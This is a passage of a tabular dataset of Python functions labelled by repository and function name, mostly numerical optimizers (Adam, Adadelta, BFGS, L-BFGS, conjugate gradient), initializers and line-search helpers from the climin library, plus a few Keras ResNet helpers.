    self.val_acc['batch'].append(logs.get('val_acc'))"
BIGBALLON/cifar-10-cnn,on_epoch_end,"def on_epoch_end(self, batch, logs={}):
    self.val_acc['epoch'].append(logs.get('val_acc'))"
BIGBALLON/cifar-10-cnn,print_best_acc,"def print_best_acc(self):
    print('== BEST ACC: {:.4f} =='.format(max(self.val_acc['epoch'])))"
BIGBALLON/cifar-10-cnn,bn_relu,"def bn_relu(x):
    x = BatchNormalization(momentum=0.9, epsilon=1e-05)(x)
    return Activation('relu')(x)"
BIGBALLON/cifar-10-cnn,conv,"def conv(x, out, size, stride):
    return Conv2D(out, kernel_size=size, strides=stride, padding='same', kernel_initializer='he_normal', kernel_regularizer=regularizers.l2(weight_decay))(x)"
BIGBALLON/cifar-10-cnn,residual_block,"def residual_block(x, o_filters, increase=False):
    stride = (2, 2) if increase else (1, 1)
    o1 = bn_relu(x)
    conv_1 = conv(o1, o_filters, (3, 3), stride)
    o2 = bn_relu(conv_1)
    conv_2 = conv(o2, o_filters, (3, 3), (1, 1))
    if increase:
        projection = conv(o1, o_filters, (1, 1), (2, 2))
        block = add([conv_2, projection])
    else:
        block = add([conv_2, x])
    return block"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_rate=1, decay=0.9, momentum=0, offset=0.0001, args=None):
    """"""Create an Adadelta object.

        Parameters
        ----------

        wrt : array_like
            Array that represents the solution. Will be operated upon in
            place.  ``fprime`` should accept this array as a first argument.

        fprime : callable
            Callable that given a solution vector as first parameter and *args
            and **kwargs drawn from the iterations ``args`` returns a
            search direction, such as a gradient.

        step_rate : scalar or array_like, optional [default: 1]
            Value to multiply steps with before they are applied to the
            parameter vector.

        decay : float, optional [default: 0.9]
            Decay parameter for the moving average. Must lie in [0, 1) where
            lower numbers means a shorter ""memory"".

        momentum : float or array_like, optional [default: 0]
          Momentum to use during optimization. Can be specified analoguously
          (but independent of) step rate.

        offset : float, optional, [default: 1e-4]
            Before taking the square root of the running averages, this offset
            is added.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    super(Adadelta, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.step_rate = step_rate
    self.decay = decay
    self.offset = offset
    self.momentum = momentum
    self.gms = 0
    self.sms = 0
    self.step = 0"
BRML/climin,_iterate,"def _iterate(self):
    for (args, kwargs) in self.args:
        step_m1 = self.step
        d = self.decay
        o = self.offset
        m = self.momentum
        step1 = step_m1 * m
        self.wrt -= step1
        gradient = self.fprime(self.wrt, *args, **kwargs)
        self.gms = d * self.gms + (1 - d) * gradient ** 2
        step2 = sqrt(self.sms + o) / sqrt(self.gms + o) * gradient * self.step_rate
        self.wrt -= step2
        self.step = step1 + step2
        self.sms = d * self.sms + (1 - d) * self.step ** 2
        self.n_iter += 1
        yield {'n_iter': self.n_iter, 'gradient': gradient, 'args': args, 'kwargs': kwargs}"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_rate=0.0002, decay=None, decay_mom1=0.1, decay_mom2=0.001, momentum=0, offset=1e-08, args=None):
    """"""Create an Adam object.

        Parameters
        ----------

        wrt : array_like
            Array that represents the solution. Will be operated upon in
            place.  ``fprime`` should accept this array as a first argument.

        fprime : callable
            Callable that given a solution vector as first parameter and *args
            and **kwargs drawn from the iterations ``args`` returns a
            search direction, such as a gradient.

        step_rate : scalar or array_like, optional [default: 1]
            Value to multiply steps with before they are applied to the
            parameter vector.

        decay_mom1 : float, optional, [default: 0.1]
            Decay parameter for the exponential moving average estimate of the
            first moment.

        decay_mom2 : float, optional, [default: 0.001]
            Decay parameter for the exponential moving average estimate of the
            second moment.

        momentum : float or array_like, optional [default: 0]
            Momentum to use during optimization. Can be specified analogously
            (but independent of) step rate.

        offset : float, optional, [default: 1e-8]
            Before taking the square root of the running averages, this offset
            is added.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    if not 0 < decay_mom1 <= 1:
        raise ValueError('decay_mom1 has to lie in (0, 1]')
    if not 0 < decay_mom2 <= 1:
        raise ValueError('decay_mom2 has to lie in (0, 1]')
    if not (1 - decay_mom1 * 2) / (1 - decay_mom2) ** 0.5 < 1:
        warnings.warn('constraint from convergence analysis for adam not satisfied; check original paper to see if you really want to do this.')
    if decay is not None:
        warnings.warn('decay parameter was used in a previous verion of Adam and no longer has any effect.')
    super(Adam, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.step_rate = step_rate
    self.decay_mom1 = decay_mom1
    self.decay_mom2 = decay_mom2
    self.offset = offset
    self.momentum = momentum
    self.est_mom1_b = 0
    self.est_mom2_b = 0
    self.step = 0"
BRML/climin,_iterate,"def _iterate(self):
    for (args, kwargs) in self.args:
        m = self.momentum
        dm1 = self.decay_mom1
        dm2 = self.decay_mom2
        o = self.offset
        t = self.n_iter + 1
        step_m1 = self.step
        step1 = step_m1 * m
        self.wrt -= step1
        est_mom1_b_m1 = self.est_mom1_b
        est_mom2_b_m1 = self.est_mom2_b
        gradient = self.fprime(self.wrt, *args, **kwargs)
        self.est_mom1_b = dm1 * gradient + (1 - dm1) * est_mom1_b_m1
        self.est_mom2_b = dm2 * gradient ** 2 + (1 - dm2) * est_mom2_b_m1
        step_t = self.step_rate * (1 - (1 - dm2) ** t) ** 0.5 / (1 - (1 - dm1) ** t)
        step2 = step_t * self.est_mom1_b / (self.est_mom2_b ** 0.5 + o)
        self.wrt -= step2
        self.step = step1 + step2
        self.n_iter += 1
        yield {'n_iter': self.n_iter, 'gradient': gradient, 'args': args, 'kwargs': kwargs}"
BRML/climin,__init__,"def __init__(self, wrt, fprime, eta0=1e-05, lmbd=0.0001, alpha=0.75, t0=100000000.0, args=None):
    super(Asgd, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.eta0 = eta0
    self.lmbd = lmbd
    self.alpha = alpha
    self.t0 = t0
    self.mu_t = 1
    self.eta_t = eta0"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,__iter__,"def __iter__(self):
    self.w = self.wrt.copy()
    self.wrt *= 0
    step = 0
    for (i, (args, kwargs)) in enumerate(self.args):
        gradient = self.fprime(self.w, *args, **kwargs)
        self.w *= 1 - self.lmbd * self.eta_t
        self.w -= self.eta_t * gradient
        if self.mu_t < 1:
            step = self.mu_t * (self.w - self.wrt)
            self.wrt += step
        else:
            self.wrt *= 0
            self.wrt += self.w
        self.mu_t = 1.0 / max(1, i + 1 - self.t0)
        self.eta_t = self.eta0 / (1 + self.lmbd * self.eta0 * (i + 1)) ** self.alpha
        yield {'n_iter': i, 'gradient': gradient, 'mu_t': self.mu_t, 'eta_t': self.eta_t, 'step': step, 'args': args, 'kwargs': kwargs}"
BRML/climin,repeat_or_iter,"def repeat_or_iter(obj):
    try:
        return iter(obj)
    except TypeError:
        return itertools.repeat(obj)"
BRML/climin,is_nonzerofinite,"def is_nonzerofinite(arr):
    """"""Return True if the array is neither zero, NaN or infinite.""""""
    return (arr != 0).any() and np.isfinite(arr).all()"
BRML/climin,__init__,"def __init__(self, wrt, args=None):
    self.wrt = wrt
    if args is None:
        self.args = itertools.repeat(([], {}))
    else:
        self.args = args
    self.n_iter = 0"
BRML/climin,set_from_info,"def set_from_info(self, info):
    """"""Populate the fields of this object with the corresponding fields of
        a dictionary.

        Parameters
        ----------

        info : dict
            Has to contain a key for each of the objects in the
            ``.state_fields`` list. The field will be set according to the entry
            in the dictionary.
        """"""
    for f in self.state_fields:
        self.__dict__[f] = info[f]"
BRML/climin,extended_info,"def extended_info(self, **kw):
    """"""Return a dictionary populated with the values of the state fields.
        Further values can be given as keyword arguments.

        Parameters
        ----------

        **kw : dict
            Arbitrary data to place into dictionary.

        Returns
        -------

        dct : dict
            Contains all attributes of the class given by the ``state_fields``
            attribute. Additionally updated with elements from ``kw``.
        """"""
    dct = dict(((f, getattr(self, f)) for f in self.state_fields))
    dct.update(kw)
    return dct"
BRML/climin,minimize_until,"def minimize_until(self, criterions):
    """"""Minimize until one of the supplied `criterions` is met.

        Each criterion is a callable that, given the info object yielded by
        an optimizer, returns a boolean indicating whether to stop. False means
        to continue, True means to stop.""""""
    if not criterions:
        raise ValueError('need to supply at least one criterion')
    if not isinstance(criterions, collections.Iterable):
        criterions = [criterions]
    info = {}
    for info in self:
        for criterion in criterions:
            if criterion(info):
                return info
    return info"
BRML/climin,__iter__,"def __iter__(self):
    for info in self._iterate():
        yield self.extended_info(**info)"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, initial_inv_hessian=None, line_search=None, args=None):
    """"""Create a BFGS object.

        Parameters
        ----------

        wrt : array_like
            Array that represents the solution. Will be operated upon in
            place.  ``f`` and ``fprime`` should accept this array as a first argument.

        f : callable
            The objective function.

        fprime : callable
            Callable that given a solution vector as first parameter and *args
            and **kwargs drawn from the iterations ``args`` returns a
            search direction, such as a gradient.

        initial_inv_hessian : array_like
            The initial estimate of the approximiate Hessian.

        line_search : LineSearch object.
            Line search object to perform line searches with.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    super(Bfgs, self).__init__(wrt, args=args)
    self.f = f
    self.fprime = fprime
    self.inv_hessian = initial_inv_hessian
    if line_search is not None:
        self.line_search = line_search
    else:
        self.line_search = WolfeLineSearch(wrt, self.f, self.fprime)"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,find_direction,"def find_direction(self, grad_m1, grad, step, inv_hessian):
    H = self.inv_hessian
    grad_diff = grad - grad_m1
    ys = np.inner(grad_diff, step)
    Hy = np.dot(H, grad_diff)
    yHy = np.inner(grad_diff, Hy)
    H += (ys + yHy) * np.outer(step, step) / ys ** 2
    H -= (np.outer(Hy, step) + np.outer(step, Hy)) / ys
    direction = -np.dot(H, grad)
    return (direction, {'gradient_diff': grad_diff})"
BRML/climin,__iter__,"def __iter__(self):
    (args, kwargs) = next(self.args)
    grad = self.fprime(self.wrt, *args, **kwargs)
    grad_m1 = scipy.zeros(grad.shape)
    if self.inv_hessian is None:
        self.inv_hessian = scipy.eye(grad.shape[0])
    for (i, (next_args, next_kwargs)) in enumerate(self.args):
        if i == 0:
            (direction, info) = (-grad, {})
        else:
            (direction, info) = self.find_direction(grad_m1, grad, step, self.inv_hessian)
        if not is_nonzerofinite(direction):
            break
        step_length = self.line_search.search(direction, None, args, kwargs)
        if step_length != 0:
            step = step_length * direction
            self.wrt += step
        else:
            self.logfunc({'message': 'step length is 0--need to bail out.'})
            break
        (args, kwargs) = (next_args, next_kwargs)
        (grad_m1[:], grad[:]) = (grad, self.line_search.grad)
        info.update({'step_length': step_length, 'n_iter': i, 'args': args, 'kwargs': kwargs})
        yield info"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, initial_inv_hessian=None, line_search=None, args=None):
    super(Sbfgs, self).__init__(wrt, f, fprime, line_search, args=args)"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,find_direction,"def find_direction(self, grad_m1, grad, step, inv_hessian):
    H = inv_hessian
    grad_diff = grad - grad_m1
    ys = np.inner(grad_diff, step)
    Hy = np.dot(H, grad_diff)
    yHy = np.inner(grad_diff, Hy)
    gamma = ys / yHy
    v = scipy.sqrt(yHy) * (step / ys - Hy / yHy)
    v = scipy.real(v)
    H[:] = gamma * (H - np.outer(Hy, Hy) / yHy + np.outer(v, v))
    H += np.outer(step, step) / ys
    direction = -np.dot(H, grad)
    return (direction, {})"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, initial_hessian_diag=1, n_factors=10, line_search=None, args=None):
    """"""
        Create an Lbfgs object.

        Attributes
        ----------
        wrt : array_like
            Current solution to the problem. Can be given as a first argument to             ``.f`` and ``.fprime``.

        f : Callable
            The object function.

        fprime : Callable
            First derivative of the objective function. Returns an array of the             same shape as ``.wrt``.

        initial_hessian_diag : array_like
            The initial estimate of the diagonal of the Hessian.

        n_factors : int
            The number of factors that should be used to implicitly represent the inverse Hessian.

        line_search : LineSearch object.
            Line search object to perform line searches with.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.

        """"""
    super(Lbfgs, self).__init__(wrt, args=args)
    self.f = f
    self.fprime = fprime
    self.initial_hessian_diag = initial_hessian_diag
    self.n_factors = n_factors
    if line_search is not None:
        self.line_search = line_search
    else:
        self.line_search = WolfeLineSearch(wrt, self.f, self.fprime)"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,find_direction,"def find_direction(self, grad_diffs, steps, grad, hessian_diag, idxs):
    grad = grad.copy()
    n_current_factors = len(idxs)
    rho = scipy.empty(n_current_factors)
    for i in idxs:
        rho[i] = 1 / scipy.inner(grad_diffs[i], steps[i])
    alpha = scipy.empty(n_current_factors)
    for i in idxs[::-1]:
        alpha[i] = rho[i] * scipy.inner(steps[i], grad)
        grad -= alpha[i] * grad_diffs[i]
    z = hessian_diag * grad
    beta = scipy.empty(n_current_factors)
    for i in idxs:
        beta[i] = rho[i] * scipy.inner(grad_diffs[i], z)
        z += steps[i] * (alpha[i] - beta[i])
    return (z, {})"
BRML/climin,__iter__,"def __iter__(self):
    (args, kwargs) = next(self.args)
    grad = self.fprime(self.wrt, *args, **kwargs)
    grad_m1 = scipy.zeros(grad.shape)
    factor_shape = (self.n_factors, self.wrt.shape[0])
    grad_diffs = scipy.zeros(factor_shape)
    steps = scipy.zeros(factor_shape)
    hessian_diag = self.initial_hessian_diag
    step_length = None
    step = scipy.empty(grad.shape)
    grad_diff = scipy.empty(grad.shape)
    idxs = []
    for (i, (next_args, next_kwargs)) in enumerate(self.args):
        if i == 0:
            direction = -grad
            info = {}
        else:
            sTgd = scipy.inner(step, grad_diff)
            if sTgd > 1e-10:
                if not idxs:
                    this_idx = 0
                elif len(idxs) < self.n_factors:
                    this_idx = idxs[-1] + 1
                else:
                    this_idx = idxs.pop(0)
                idxs.append(this_idx)
                grad_diffs[this_idx] = grad_diff
                steps[this_idx] = step
                hessian_diag = sTgd / scipy.inner(grad_diff, grad_diff)
            (direction, info) = self.find_direction(grad_diffs, steps, -grad, hessian_diag, idxs)
        if not is_nonzerofinite(direction):
            warnings.warn('search direction is either 0, nan or inf')
            break
        step_length = self.line_search.search(direction, None, args, kwargs)
        step[:] = step_length * direction
        if step_length != 0:
            self.wrt += step
        else:
            warnings.warn('step length is 0')
            pass
        (args, kwargs) = (next_args, next_kwargs)
        (grad_m1[:], grad[:]) = (grad, self.line_search.grad)
        grad_diff = grad - grad_m1
        info.update({'step_length': step_length, 'n_iter': i, 'args': args, 'kwargs': kwargs, 'loss': self.line_search.val, 'gradient': grad, 'gradient_m1': grad_m1})
        yield info"
BRML/climin,__init__,"def __init__(self, wrt, H=None, b=None, f_Hp=None, min_grad=1e-14, precond=None):
    """"""Create a ConjugateGradient object.

        Parameters
        ----------

        wrt : array_like
            Parameters of the problem.

        H : array_like, 2 dimensional, square
            Curvature term of the quadratic, the Hessian.

        b : array_like
            Linear term of the quadratic.

        f_Hp : callable
            Function to calculcate the dot product of a Hessian with an
            arbitrary vector.

        min_grad : float, optional, default: 1e-14
            If all components of the gradient fall below this threshold,
            stop optimization.

        precond : array_like
            Matrix to precondition the problem. If a vector, is taken to
            represent a diagonal matrix.
        """"""
    super(ConjugateGradient, self).__init__(wrt, args=None)
    self.f_Hp = f_Hp if f_Hp is not None else lambda p: np.dot(H, p)
    self.b = b
    self.min_grad = min_grad
    self.precond = precond"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,solve,"def solve(self, r):
    if self.precond is None:
        return r
    elif self.precond.ndim == 1:
        return r / self.precond
    else:
        return scipy.linalg.solve(self.precond, r)"
BRML/climin,__iter__,"def __iter__(self):
    grad = self.f_Hp(self.wrt) - self.b
    y = self.solve(grad)
    direction = -y
    if (grad == 0).all():
        warnings.warn('gradient is 0')
        return
    for i in range(self.wrt.size):
        Hp = self.f_Hp(direction)
        ry = np.dot(grad, y)
        pHp = np.inner(direction, Hp)
        step_length = ry / pHp
        self.wrt += step_length * direction
        if i % 10 == 0:
            grad = self.f_Hp(self.wrt) - self.b
        else:
            grad += step_length * Hp
        y = self.solve(grad)
        beta = np.dot(grad, y) / ry
        direction = -y + beta * direction
        if (abs(grad) < self.min_grad).all():
            warnings.warn('gradient is below threshold')
            break
        yield {'ry': ry, 'Hp': Hp, 'pHp': pHp, 'step_length': step_length, 'n_iter': i}"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, min_grad=1e-06, args=None):
    """"""Create a NonlinearConjugateGradient object.

        Parameters
        ----------

        wrt : array_like
            Array of parameters of the problem.

        f : callable
            Objective function.

        fprime : callable
            First derivative of the objective function.

        min_grad : float
            If all components of the gradient fall below this value, stop
            minimization.

        args : iterable, optional
            Iterable of arguments passed on to the objective function and its
            derivatives.
        """"""
    super(NonlinearConjugateGradient, self).__init__(wrt, args=args)
    self.f = f
    self.fprime = fprime
    self.line_search = WolfeLineSearch(wrt, self.f, self.fprime, c2=0.2)
    self.min_grad = min_grad"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,find_direction,"def find_direction(self, grad_m1, grad, direction_m1):
    grad_norm_m1 = np.dot(grad_m1, grad_m1)
    grad_diff = grad - grad_m1
    betaFR = np.dot(grad, grad) / grad_norm_m1
    betaPR = np.dot(grad, grad_diff) / grad_norm_m1
    betaHS = np.dot(grad, grad_diff) / np.dot(direction_m1, grad_diff)
    beta = max(-betaFR, min(betaPR, betaFR))
    if np.dot(grad, grad_m1) / grad_norm_m1 > 0.1:
        beta = 0
    direction = -grad + beta * direction_m1
    return (direction, {})"
BRML/climin,__iter__,"def __iter__(self):
    (args, kwargs) = next(self.args)
    grad = self.fprime(self.wrt, *args, **kwargs)
    grad_m1 = np.zeros(grad.shape)
    loss = self.f(self.wrt, *args, **kwargs)
    loss_m1 = 0
    for (i, (next_args, next_kwargs)) in enumerate(self.args):
        if i == 0:
            (direction, info) = (-grad, {})
        else:
            (direction, info) = self.find_direction(grad_m1, grad, direction)
        if not is_nonzerofinite(direction):
            warnings.warn('gradient is either zero, nan or inf')
            break
        initialization = 2 * (loss - loss_m1) / np.dot(grad, direction)
        initialization = min(1, initialization)
        step_length = self.line_search.search(direction, initialization, args, kwargs)
        self.wrt += step_length * direction
        if (abs(grad) < self.min_grad).all():
            warnings.warn('gradient is too small')
            break
        (args, kwargs) = (next_args, next_kwargs)
        (grad_m1[:], grad[:]) = (grad, self.line_search.grad)
        (loss_m1, loss) = (loss, self.line_search.val)
        info.update({'n_iter': i, 'args': args, 'kwargs': kwargs, 'loss': loss, 'gradient': grad, 'gradient_m1': grad_m1, 'step_length': step_length})
        yield info"
BRML/climin,momentum_type,"@property
def momentum_type(self):
    return self._momentum_type"
BRML/climin,momentum_type,"@momentum_type.setter
def momentum_type(self, value):
    if value not in ('nesterov', 'standard'):
        raise ValueError('unknown momentum type')
    self._momentum_type = value"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_rate=0.1, momentum=0.0, momentum_type='standard', args=None):
    """"""Create a GradientDescent object.

        Parameters
        ----------

        wrt : array_like
            Array that represents the solution. Will be operated upon in
            place.  ``fprime`` should accept this array as a first argument.

        fprime : callable
            Callable that given a solution vector as first parameter and *args
            and **kwargs drawn from the iterations ``args`` returns a
            search direction, such as a gradient.

        step_rate : float or array_like, or iterable of that
            Step rate to use during optimization. Can be given as a single
            scalar value or as an array for a different step rate of each
            parameter of the problem.

            Can also be given as an iterator; in that case, every iteration
            of the optimization takes a new element as a step rate from that
            iterator.

        momentum : float or array_like, or iterable of that
          Momentum to use during optimization. Can be specified analoguously
          (but independent of) step rate.

        momentum_type : string (either ""standard"" or ""nesterov"")
            When to add the momentum term to the paramter vector; in the first
            case it will be done after the calculation of the gradient, in the
            latter before.

        args : iterable
            Iterator of arguments which ``fprime`` will be called
            with.
        """"""
    super(GradientDescent, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.step_rate = step_rate
    self.momentum = momentum
    self._momentum_type = None
    self.momentum_type = momentum_type
    self.step = 0"
BRML/climin,__iter__,"def __iter__(self):
    for (args, kwargs) in self.args:
        step_rate = self.step_rate
        momentum = self.momentum
        step_m1 = self.step
        if self.momentum_type == 'standard':
            gradient = self.fprime(self.wrt, *args, **kwargs)
            step = gradient * step_rate + momentum * step_m1
            self.wrt -= step
        elif self.momentum_type == 'nesterov':
            big_jump = momentum * step_m1
            self.wrt -= big_jump
            gradient = self.fprime(self.wrt, *args, **kwargs)
            correction = step_rate * gradient
            self.wrt -= correction
            step = big_jump + correction
        self.step = step
        self.n_iter += 1
        yield self.extended_info(gradient=gradient, args=args, kwargs=kwargs)"
BRML/climin,sparsify_columns,"def sparsify_columns(arr, n_non_zero, keep_diagonal=False, random_state=None):
    """"""Set all but ``n_non_zero`` entries to zero for each column of ``arr``.

    This is a common technique to find better starting points for learning
    deep and/or recurrent networks.

    Parameters
    ----------

    arr : array_like, two dimensional
      Array to work upon in place.

    n_non_zero : integer
      Amount of non zero entries to keep.

    keep_diagonal : boolean, optional [default: False]
      If set to True and ``arr`` is square, do keep the diagonal.

    random_state : numpy.random.RandomState object, optional [default : None]
      If set, random number generator that will generate the indices
      corresponding to the zero-valued columns.

    Examples
    --------

    >>> import numpy as np
    >>> from climin.initialize import sparsify_columns
    >>> arr = np.arange(9).reshape((3, 3))
    >>> sparsify_columns(arr, 1)
    >>> arr                                         # doctest: +SKIP
    array([[0, 0, 0],
           [0, 4, 5],
           [6, 0, 0]])
    """"""
    colsize = arr.shape[0]
    arr_np = arr if isinstance(arr, np.ndarray) else arr.as_numpy_array()
    mask = np.ones_like(arr_np)
    for i in range(arr.shape[1]):
        idxs = range(colsize)
        if random_state is None:
            zeros = random.sample(idxs, colsize - n_non_zero)
        else:
            zeros = random_state.choice(idxs, colsize - n_non_zero, replace=False)
        mask[zeros, i] *= 0
    if keep_diagonal and arr.shape[0] == arr.shape[1]:
        mask += np.eye(arr.shape[0])
    arr *= mask"
BRML/climin,bound_spectral_radius,"def bound_spectral_radius(arr, bound=1.2):
    """"""Set the spectral radius of the square matrix ``arr`` to ``bound``.

    This is performed by scaling eigenvalues of ``arr``.

    Parameters
    ----------

    arr : array_like, two dimensional
        Array to work upon in place.

    bound : float, optional, default: 1.2

    Examples
    --------

    >>> import numpy as np
    >>> from climin.initialize import bound_spectral_radius
    >>> arr = np.arange(9).reshape((3, 3)).astype('float64')
    >>> bound_spectral_radius(arr, 1.1)
    >>> arr                                 # doctest: +SKIP
    array([[ -7.86816957e-17,   8.98979486e-02,   1.79795897e-01],
           [  2.69693846e-01,   3.59591794e-01,   4.49489743e-01],
           [  5.39387691e-01,   6.29285640e-01,   7.19183588e-01]])
    """"""
    spectral_radius = abs(np.linalg.eigvals(ma.assert_numpy(arr))).max()
    arr[...] *= bound / spectral_radius"
BRML/climin,orthogonal,"def orthogonal(arr, shape=None):
    """"""Initialize the tensor ''arr'' with random orthogonal matrices

    This is performed by QR decomposition of random matrices and
    setting parts of ''arr'' to Q.

    Q is an orthogonal matrix only iff parts of ``arr`` are square, i.e.,
     arr[..., :, :] is square or ''shape'' is that of a square matrix.
     Otherwise either rows or columns of Q are orthogonal, but not both.

    Parameters
    ----------

    arr : tensor_like, n-dimensional
        Tensor to work upon in place.

    shape : 2-tuple optional, default: None
        If len(arr.shape) != 2 or if it is not square, it is required to
        specify the shape of matrices that comprise ''arr''.

     Examples
    --------

    >>> import numpy as np
    >>> from climin.initialize import orthogonal
    >>> arr = np.empty((3, 3))
    >>> orthogonal(arr)
    >>> arr                                 # doctest: +SKIP
    array([[-0.44670617 -0.88694894  0.11736768]
         [ 0.08723642 -0.17373873 -0.98092031]
         [ 0.89041755 -0.42794442  0.15498441]]
    >>> arr = np.empty((3, 4, 1))
    >>> orthogonal(arr, shape=(2, 2))
    >>> arr.reshape((3, 2, 2))              # doctest: +SKIP
    array([[[-0.81455859  0.58008129]
          [ 0.58008129  0.81455859]]

         [[-0.75214632 -0.65899614]
          [-0.65899614  0.75214632]]

         [[-0.97017102 -0.24242153]
          [-0.24242153  0.97017102]]])
    """"""
    if shape is not None:
        (d1, d2) = shape
    elif len(arr.shape) >= 2:
        (d1, d2) = arr.shape[-2:]
    else:
        raise ValueError('Cannot ortho-initialize vectors. Please specify shape')
    shape = (arr.size / d1 / d2, d1, d2)
    if shape[0] == 1 and d1 == 1 or d2 == 1:
        raise ValueError('Cannot ortho-initialize vectors.')
    if np.prod(shape) != arr.size:
        raise ValueError('Invalid shape')
    samples = np.random.randn(*shape)
    for (i, sample) in enumerate(samples):
        if d2 > d1:
            samples[i, ...] = np.linalg.qr(sample.T)[0].T
        else:
            samples[i, ...] = np.linalg.qr(sample)[0]
    arr[...] = samples.reshape(arr.shape)"
BRML/climin,randomize_normal,"def randomize_normal(arr, loc=0, scale=1, random_state=None):
    """"""Populate an array with random numbers from a normal distribution with
    mean `loc` and standard deviation `scale`.

    Parameters
    ----------

    arr : array_like
      Array to work upon in place.

    loc : float
      Mean of the random numbers.

    scale : float
      Standard deviation of the random numbers.

    random_state : np.random.RandomState object, optional [default : None]
      Random number generator that shall generate the random numbers.

    Examples
    --------

    >>> import numpy as np
    >>> from climin.initialize import randomize_normal
    >>> arr = np.empty((3, 3))
    >>> randomize_normal(arr)
    >>> arr                                 # doctest: +SKIP
    array([[ 0.18076413,  0.60880657,  1.20855691],
           [ 1.7799948 , -0.82565481,  0.53875307],
           [-0.67056028, -1.46257419,  1.17033425]])
    >>> randomize_normal(arr, 10, 0.1)
    >>> arr                                 # doctest: +SKIP
    array([[ 10.02221481,  10.0982449 ,  10.02495358],
          [  9.99867829,   9.99410111,   9.8242318 ],
          [  9.9383779 ,   9.94880091,  10.03179085]])
    """"""
    rng = np.random if random_state is None else random_state
    sample = rng.normal(loc, scale, arr.shape)
    if isinstance(arr, np.ndarray):
        arr[...] = sample.astype(arr.dtype)
    else:
        arr[:] = sample.astype('float32')"
BRML/climin,polyinterp,"def polyinterp(points, xminBound=None, xmaxBound=None):
    """"""
    Minimum of interpolating polynomial based
    on function and derivative values.

    Note: doPlot from minFunc missing!!!
    """"""
    nPoints = points.shape[0]
    order = np.sum(np.isreal(points[:, 1:3])) - 1
    if nPoints == 2 and order == 3 and (xminBound is None) and (xmaxBound is None):
        minVal = np.min(points[:, 0])
        minPos = np.argmin(points[:, 0])
        notMinPos = 1 - minPos
        x1 = points[minPos, 0]
        x2 = points[notMinPos, 0]
        g1 = points[minPos, 2]
        g2 = points[notMinPos, 2]
        f1 = points[minPos, 1]
        f2 = points[notMinPos, 1]
        d1 = g1 + g2 - 3 * (f1 - f2) / (x1 - x2)
        d2 = sp.sqrt(d1 ** 2 - g1 * g2)
        if np.isreal(d2):
            t = points[notMinPos, 0] - (points[notMinPos, 0] - points[minPos, 0]) * ((points[notMinPos, 2] + d2 - d1) / (points[notMinPos, 2] - points[minPos, 2] + 2 * d2))
            minPos = np.minimum(np.maximum(t, points[minPos, 0]), points[notMinPos, 0])
        else:
            minPos = np.mean(points[:, 0])
        return (minPos, None)
    xmin = np.min(points[:, 0])
    xmax = np.max(points[:, 0])
    if xminBound is None:
        xminBound = xmin
    if xmaxBound is None:
        xmaxBound = xmax
    A = np.zeros((2 * nPoints, order + 1))
    b = np.zeros((2 * nPoints, 1))
    for i in range(points.shape[0]):
        if np.isreal(points[i, 1]):
            A[i] = [points[i, 0] ** (order - j) for j in range(order + 1)]
            b[i] = points[i, 1]
            (points[i, 0], points[i, 1])
    for (i, p) in enumerate(points[:, 2]):
        if np.isreal(p):
            A[nPoints + i] = [(order - j + 1) * points[i, 0] ** (order - j) for j in range(1, order + 1)] + [0]
            b[nPoints + i] = points[i, 2]
    params = np.linalg.lstsq(A, b)[0].flatten()
    dParams = [(order - j) * params[j] for j in range(order)]
    cp = [xminBound, xmaxBound] + list(points[:, 0])
    if not np.any(np.isinf(dParams)):
        cp += list(np.roots(dParams))
    fmin = np.inf
    minPos = (xminBound + xmaxBound) / 2.0
    for x in cp:
        if np.isreal(x) and x >= xminBound and (x <= xmaxBound):
            fx = np.polyval(params, x)
            if np.isreal(fx) and fx <= fmin:
                minPos = x
                fmin = fx
    return (minPos, fmin)"
BRML/climin,mixedExtrap,"def mixedExtrap(x0, f0, g0, x1, f1, g1, minStep, maxStep):
    """"""
    From minFunc, without switches doPlot and debug.
    """"""
    (alpha_c, _) = polyinterp(points=np.array([[x0, f0, g0], [x1, f1, g1]]), xminBound=minStep, xmaxBound=maxStep)
    (alpha_s, _) = polyinterp(points=np.array([[x0, f0, g0], [x1, 1j, g1]]), xminBound=minStep, xmaxBound=maxStep)
    if alpha_c > minStep and abs(alpha_c - x1) < abs(alpha_s - x1):
        t = alpha_c
    else:
        t = alpha_s
    return t"
BRML/climin,isLegal,"def isLegal(v):
    """"""
    Do exactly that.
    """"""
    return not (np.any(np.iscomplex(v)) or np.any(np.isnan(v)) or np.any(np.isinf(v)))"
